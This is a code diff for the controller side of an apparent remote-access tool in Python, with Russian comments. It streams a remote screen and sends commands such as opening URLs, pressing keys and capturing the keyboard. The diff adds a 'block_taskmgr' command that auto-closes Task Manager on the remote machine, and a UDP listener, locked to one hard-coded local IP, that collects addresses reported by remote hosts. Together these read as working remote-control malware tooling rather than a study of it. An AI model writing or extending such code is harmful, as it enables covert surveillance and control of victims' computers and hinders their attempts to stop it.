@@ -6,6 +6,7 @@ import threading
 import time
 import keyboard  # Новая библиотека для перехвата клавиш
 import sys
+import struct
 
 class ScreenReceiver(threading.Thread):
     def __init__(self, sock):
@@ -155,6 +156,7 @@ class CommandSender(threading.Thread):
         print("open <url> - открыть ссылку в браузере")
         print("key X - нажать клавишу X")
         print("keyboard_capture - перехватить клавиатуру (ESC для выхода)")
+        print("block_taskmgr - автозакрытие диспетчера задач")
         print("exit - отключиться")
         print("\nYou can send multiple commands at once by separating them with semicolons (;).")
         
@@ -222,6 +224,23 @@ class CommandSender(threading.Thread):
             self.stop()
             self.screen_receiver.stop()
 
+def multicast_recv():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))  # Google's public DNS
+    local_ip = s.getsockname()[0]
+    s.close()
+    
+    if local_ip != "172.16.79.23":
+        print("не с того компа запускаешь, нужен который 172.16.79.23")
+        return
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((local_ip, 45631))
+    
+    while True:
+        data, address = sock.recvfrom(4096)
+        print(f"Received message: {data.decode('utf-8')}")
+
 def get_valid_ip():
     """Функция для проверки правильности IP-адреса"""
     while True:
@@ -245,44 +264,49 @@ def main():
         print("Please install it with: pip install keyboard")
         sys.exit(1)
     
-    while True:
-        try:
-            HOST = get_valid_ip()
-            
-            print(f"Attempting to connect to {HOST}:{PORT}...")
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(5)
-                try:
-                    s.connect((HOST, PORT))
-                    print(f"Successfully connected to {HOST}:{PORT}")
-                    
-                    receiver = ScreenReceiver(s)
-                    command_sender = CommandSender(s, receiver)
-                    
-                    receiver.start()
-                    command_sender.start()
-                    
-                    receiver.join()
-                    command_sender.join()
-                    
-                    break
-                    
-                except socket.timeout:
-                    print(f"Connection timed out. Server may be down or IP {HOST} is incorrect.")
-                except ConnectionRefusedError:
-                    print(f"Connection refused. Make sure server is running on {HOST}:{PORT}")
-                except Exception as e:
-                    print(f"Connection error: {e}")
+    mode = input("1 to connect, 2 to receive ips: ")
+    
+    if mode == "2":
+        multicast_recv()
+    elif mode == "1":
+        while True:
+            try:
+                HOST = get_valid_ip()
                 
-        except Exception as e:
-            print(f"Fatal error: {e}")
-            break
-            
-        retry = input("Would you like to try again? (y/n): ").lower()
-        if retry != 'y':
-            break
+                print(f"Attempting to connect to {HOST}:{PORT}...")
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(5)
+                    try:
+                        s.connect((HOST, PORT))
+                        print(f"Successfully connected to {HOST}:{PORT}")
+                        
+                        receiver = ScreenReceiver(s)
+                        command_sender = CommandSender(s, receiver)
+                        
+                        receiver.start()
+                        command_sender.start()
+                        
+                        receiver.join()
+                        command_sender.join()
+                        
+                        break
+                        
+                    except socket.timeout:
+                        print(f"Connection timed out. Server may be down or IP {HOST} is incorrect.")
+                    except ConnectionRefusedError:
+                        print(f"Connection refused. Make sure server is running on {HOST}:{PORT}")
+                    except Exception as e:
+                        print(f"Connection error: {e}")
+                    
+            except Exception as e:
+                print(f"Fatal error: {e}")
+                break
+                
+            retry = input("Would you like to try again? (y/n): ").lower()
+            if retry != 'y':
+                break
 
-    cv2.destroyAllWindows()
+        cv2.destroyAllWindows()
 
 if __name__ == "__main__":
     main()
